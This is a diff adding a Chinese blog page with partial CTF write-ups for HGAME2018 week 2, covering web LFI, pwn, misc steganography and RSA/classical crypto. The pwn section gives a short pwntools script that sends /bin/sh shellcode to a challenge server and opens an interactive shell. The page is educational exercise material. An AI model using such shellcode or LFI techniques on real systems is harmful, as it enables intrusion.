@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <!-- viewport-fit=cover is to support iPhone X rounded corners and notch in landscape-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
+
+      <title></title>
+
+      <!-- CSS -->
+      <link rel="stylesheet" href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;css&#x2F;lib&#x2F;font-awesome.min.css">
+      <link rel="stylesheet" href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;site.css">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+      <script type="text/javascript" charset="utf-8" src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;js&#x2F;sidebar.js"></script>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
+      
+
+      
+      
+    </head>
+
+    <body>
+      
+      
+        <header name="header">
+          <div>
+            <div class="logo"><a href="https:&#x2F;&#x2F;CSUwangj.github.io">LuckyDog</a></div>
+            <nav class="menu">
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io" class="nav-item-home">
+                  Home
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;categories" class="nav-item-categories">
+                  Categories
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;tags" class="nav-item-tags">
+                  Tags
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;about" class="nav-item-about">
+                  About
+                </a>
+              
+                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;archives" class="nav-item-archives">
+                  Archives
+                </a>
+              
+            </nav>
+          </div>
+        </header>
+      
+
+      <main class="content container" name="main">
+        <div class="content-wrapper">
+          
+  <div class="post">
+    <h1 class="post-title">HGAME2018-week2部分WP</h1>
+    <span class="post-date">2018-02-16</span>
+    <p>菜鸟每天飞过</p>
+<span id="continue-reading"></span>
+<ul>
+<li>Web
+<ul>
+<li>[x] Random?</li>
+<li>[x] 草莓社区-1</li>
+<li>[x] 草莓社区-2</li>
+<li>[ ] XSS-1</li>
+<li>[ ] XSS-2</li>
+<li>[ ] 最简单的sql题</li>
+</ul>
+</li>
+<li>Rev
+<ul>
+<li>[ ] wtfitis</li>
+<li>[ ] miaomiaowu</li>
+<li>[ ] iccanobif</li>
+</ul>
+</li>
+<li>PWN
+<ul>
+<li>[x] ez_shellcode</li>
+<li>[x] ez bash jail</li>
+<li>[ ] hacker_system_ver1</li>
+<li>[ ] ez_shellcode_ver2</li>
+</ul>
+</li>
+<li>Misc
+<ul>
+<li>[x] 咻咻咻</li>
+<li>[x] White cosmos</li>
+<li>[x] easy password</li>
+<li>[x] mysterious file header</li>
+</ul>
+</li>
+<li>Crypto
+<ul>
+<li>[x] easy rsa</li>
+<li>[x] the same simple RSA</li>
+<li>[ ] xasr</li>
+<li>[x] Caesar&amp;&amp;Caesar</li>
+<li>[x] violence</li>
+</ul>
+</li>
+</ul>
+<p>所以我到底是啥呢？想了想，应该是Web瞎做，Bin乱搞，其他RP选手……</p>
+<h1 id="web">Web</h1>
+<h2 id="random">Random?</h2>
+<p>首先都提示了vim改代码，那就是源码泄露咯</p>
+<p>试了一下是<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_175026.png" alt="Random1" /></p>
+<p>用vim读一下<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_175201.png" alt="Random2" /></p>
+<p>这里的方法是构造一个对象使public和secret公用空间，方法是<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_180251.png" alt="Random3" /></p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_180245.png" alt="Random4" /></p>
+<h2 id="cao-mei-she-qu-1">草莓社区-1</h2>
+<p>LFI嘛，最简单的肯定是直接来咯</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_171633.png" alt="草莓社区-1" /></p>
+<h2 id="cao-mei-she-qu-2">草莓社区-2</h2>
+<p>难一点的就用base64编码读咯</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_172618.png" alt="草莓社区-2_1" /></p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_172626.png" alt="草莓社区-2_2" /></p>
+<h1 id="pwn">PWN</h1>
+<h2 id="ez-shellcode">ez_shellcode</h2>
+<p>既然是直接执行，那找一个就好了</p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
+r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">111.230.149.72</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#d08770;">10004</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">r.recv</span><span style="color:#c0c5ce;">
+payload = &quot;</span><span style="color:#96b5b4;">\x6a\x0b</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x58</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x99</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x52</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x68\x2f\x2f\x73\x68</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x68\x2f\x62\x69\x6e</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x89\xe3</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x52</span><span style="color:#c0c5ce;">&quot; +&quot;</span><span style="color:#96b5b4;">\x53</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x89\xe1</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\xcd\x80</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
+r.</span><span style="color:#bf616a;">send</span><span style="color:#c0c5ce;">(payload)</span><span style="color:#c0c5ce;">
+r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
+</span></code></pre><h2 id="ez-bash-jail">ez bash jail</h2>
+<p>根据视频教程</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180214_171547.png" alt="ez bash jail" /></p>
+<h1 id="misc">Misc</h1>
+<h2 id="xiu-xiu-xiu">咻咻咻</h2>
+<p>首先是一个zip伪加密<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_211448.png" alt="咻咻咻1" /></p>
+<p>解压出来以后按照https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/用Ruby来解码</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_203651.png" alt="咻咻咻2" /></p>
+<p>明显是Base64，解码得flag</p>
+<h2 id="white-cosmos">White cosmos</h2>
+<p>PWNHUB密码学专场里的签到题的套路</p>
+<p>打开一看0x09/0x20心里就有底了<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_204814.png" alt="white cosmos1" /></p>
+<p>因为可见字符首位应该是0，所以0x09对应0，0x20对应1</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_205356.png" alt="white cosmos2" /></p>
+<h2 id="easy-password">easy password</h2>
+<p>没什么好说的，跑就是了</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_210003.png" alt="easy password" /></p>
+<h2 id="mysterious-file-header">mysterious file header</h2>
+<p>首先是zip包把前四字节做了一下调整，还是比较明显的，改正常以后解压就行</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_222543.png" alt="mysterious file header1" /></p>
+<p>解压出来的文件拿反编译器http://www.javadecompilers.com/搞一下</p>
+<p>有用的代码为</p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#65737e;">/*</span><span style="color:#65737e;">
+ * Decompiled with CFR 0_123.</span><span style="color:#65737e;">
+ */</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">package </span><span style="color:#c0c5ce;">GUI;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">Component</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">GridLayout</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">LayoutManager</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.event.</span><span style="color:#ebcb8b;">ActionEvent</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.event.</span><span style="color:#ebcb8b;">ActionListener</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JButton</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JFrame</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JPanel</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">public class </span><span style="color:#ebcb8b;">hgameGUI</span><span style="color:#eff1f5;">
+        </span><span style="color:#b48ead;">extends </span><span style="color:#a3be8c;">JFrame </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+    </span><span style="color:#b48ead;">private static final int </span><span style="color:#eff1f5;">DEFAULT_WIDTH </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">300</span><span style="color:#eff1f5;">;</span><span style="color:#eff1f5;">
+    </span><span style="color:#b48ead;">private static final int </span><span style="color:#eff1f5;">DEFAULT_HEIGHT </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">200</span><span style="color:#eff1f5;">;</span><span style="color:#eff1f5;">
+</span><span style="color:#eff1f5;">
+    </span><span style="color:#b48ead;">public </span><span style="color:#8fa1b3;">hgameGUI</span><span style="color:#eff1f5;">() {</span><span style="color:#eff1f5;">
+        </span><span style="color:#bf616a;">super</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Welcome to Hgame!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">setSize</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">300</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">200</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag1 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">i&#39;m flag</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag2 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">i&#39;m flag, too.</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag3 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">RU kidding me? I&#39;m the true flag!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag4 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">UR wrong, I&#39;m the true flag!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#eff1f5;"> flagtext </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Want flag? Try upstairs.</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JPanel</span><span style="color:#eff1f5;"> flag </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JPanel</span><span style="color:#eff1f5;">();</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">setLayout</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">GridLayout</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">5</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">1</span><span style="color:#eff1f5;">));</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag1);</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag2);</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag3);</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag4);</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flagtext);</span><span style="color:#eff1f5;">
+        flag1.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">118</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+                }</span><span style="color:#eff1f5;">
+        );</span><span style="color:#eff1f5;">
+        flag2.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">54</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+                }</span><span style="color:#eff1f5;">
+        );</span><span style="color:#eff1f5;">
+        flag3.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">29</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+                }</span><span style="color:#eff1f5;">
+        );</span><span style="color:#eff1f5;">
+        flag4.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">89</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+                }</span><span style="color:#eff1f5;">
+        );</span><span style="color:#eff1f5;">
+        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag);</span><span style="color:#eff1f5;">
+    }</span><span style="color:#eff1f5;">
+}</span><span style="color:#c0c5ce;">
+</span></code></pre>
+<p>智障的我反应了半天才明白这是IP地址</p>
+<p>遍历一下顺序查一下，在中国的一个IP里找到</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_211411.png" alt="mysterious file header2" /></p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_211452.png" alt="mysterious file header3" /></p>
+<h1 id="crypto">Crypto</h1>
+<h2 id="easy-rsa">easy rsa</h2>
+<p>明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ</p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">N = </span><span style="color:#d08770;">10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001</span><span style="color:#c0c5ce;">
+e = </span><span style="color:#d08770;">65537</span><span style="color:#c0c5ce;">
+c = </span><span style="color:#d08770;">4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891</span><span style="color:#c0c5ce;">
+h = </span><span style="color:#d08770;">211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+low = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
+high = h//</span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">
+mid =</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">((low+high))//</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">low&lt;high:</span><span style="color:#c0c5ce;">
+	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">low*(h-low)  &gt; N:</span><span style="color:#c0c5ce;">
+		high = mid-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
+	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
+		low = mid + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
+	mid = (low+high)//</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(low)</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(h-low)</span><span style="color:#c0c5ce;">
+</span></code></pre>
+<p>这样就有p/q了</p>
+<p>后来发现这出题人一开始应该没这样想</p>
+<p>回头补……</p>
+<h2 id="the-same-simple-rsa">The same simple RSA</h2>
+<p>先读一下key咯</p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> openssl rsa</span><span style="color:#bf616a;"> -pubin -in</span><span style="color:#c0c5ce;"> pubkey.pem</span><span style="color:#bf616a;"> -text -modulus</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">Public-Key:</span><span style="color:#c0c5ce;"> (256 bit)</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">Modulus:</span><span style="color:#c0c5ce;">
+    </span><span style="color:#bf616a;">00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><span style="color:#c0c5ce;">
+    </span><span style="color:#bf616a;">1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><span style="color:#c0c5ce;">
+    </span><span style="color:#bf616a;">be:30:dd</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">Exponent:</span><span style="color:#c0c5ce;"> 65537 (0x10001)</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">Modulus</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">-----BEGIN</span><span style="color:#c0c5ce;"> PUBLIC KEY-----</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">yigb/+l/vjDdAgMBAAE</span><span style="color:#c0c5ce;">=</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">-----END</span><span style="color:#c0c5ce;"> PUBLIC KEY-----</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">writing</span><span style="color:#c0c5ce;"> RSA key</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span></code></pre>
+<p>256位嘛，好说了</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_150022.png" alt="The same simple RSA" /></p>
+<p>然后用rsatool生成pem文件，解密得flag</p>
+<p>需要注意的是有了q/p也不能直接解密，这是使用了openssl的缘故（具体的我还没了解过</p>
+<h2 id="caesar-caesar">Caesar&amp;&amp;Caesar</h2>
+<p>直接在线解咯</p>
+<p>要分析的话，就是指数重叠+频率分析？</p>
+<h2 id="violence">violence</h2>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">a = &quot;</span><span style="color:#a3be8c;">191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
+a = a.</span><span style="color:#bf616a;">replace</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">_</span><span style="color:#c0c5ce;">&#39;,&#39;&#39;)</span><span style="color:#c0c5ce;">
+str = &quot;&quot;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(a)/</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)):</span><span style="color:#c0c5ce;">
+	str+=</span><span style="color:#96b5b4;">chr</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">ord</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;)+</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(a[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">*i]+a[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">*i+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">],</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">))</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(str)</span><span style="color:#c0c5ce;">
+</span></code></pre><pre style="background-color:#2b303b;">
+<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pycipher </span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">Affine</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+s = [</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">17</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">19</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">21</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">23</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">s:</span><span style="color:#c0c5ce;">
+	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">j </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">):</span><span style="color:#c0c5ce;">
+		</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">Affine</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">=i,</span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">=j).</span><span style="color:#bf616a;">encipher</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">zxjfghjfzhggdvfzdkhgxmuhxcfqrf</span><span style="color:#c0c5ce;">&#39;).</span><span style="color:#bf616a;">lower</span><span style="color:#c0c5ce;">())</span><span style="color:#c0c5ce;">
+</span></code></pre>
+<p>然后找到</p>
+<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_220623.png" alt="violence" /></p>
+
+  </div>
+
+        </div>
+
+        
+          <button class="sidebar-toggle" onclick="openSidebar()">O</button>
+          <aside class="sidebar" name="sidebar">
+            <div class="site-author" itemprop="author" itemtype="https://schema.org/Person">
+              
+              <img class="site-author-image" itemprop="image"
+                src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;img&#x2F;avatar.png"
+                alt="CSUwangj" />
+              
+              <p class="site-author-name">CSUwangj</p>
+              <p class="site-author-quote">Just keep in mind that hacking is very rarely in a sequence.</p>
+            </div>
+            <div class="feed-link">
+              
+                <a rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
+                  RSS
+                </a>
+              
+            </div>
+            <div class="links-of-author">
+              
+                <a href="https:&#x2F;&#x2F;github.com&#x2F;CSUwangj" title="Github" class="author-link">
+                  <i class="fa fw fa-github"></i>
+                </a>
+              
+            </div>
+            <div class="links-of-blogroll">
+              
+                <a href="https:&#x2F;&#x2F;zickshen.github.io&#x2F;">zickshen</a>
+              
+            </div>
+          </aside>
+        
+
+      </main>
+
+      
+        <footer name="footer">
+          <div class="copyright">
+            <span item="copyrightYear">© 2018-2020</span>
+            <span class="author">CSUwangj</span>
+          </div>
+          <div class="powered-by">
+            Powered by <a href="https://www.getzola.org/">Zola</a> Theme <a href="https://github.com/CSUwangj/DogFood">DogFood</a>
+          </div>
+        </footer>
+      
+    </body>
+
+</html>
